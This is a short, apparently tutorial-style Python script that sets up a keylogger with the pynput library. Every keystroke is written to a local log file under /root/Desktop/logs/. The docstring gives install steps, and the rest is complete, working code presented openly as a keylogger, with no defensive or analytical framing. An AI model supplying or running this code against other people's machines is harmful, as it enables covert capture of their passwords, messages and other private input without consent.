"""Hello guys this program allows us to create a keyboard history (keylogger)

1- We're gonna be using pynput so first you gotta have pip installed (i made a tutorial on that), then install 
pynput by typing in terminal (pip3 install pynput)

2- Create the file where you wanna save the history"""
from pynput.keyboard import Key, Listener
import logging

log_directory = r"/root/Desktop/logs/"  #the path to the file where u wanna registrer this 

logging.basicConfig(filename = (log_directory+"keylog.txt"), level = logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press = on_press) as listener:
    listener.join()
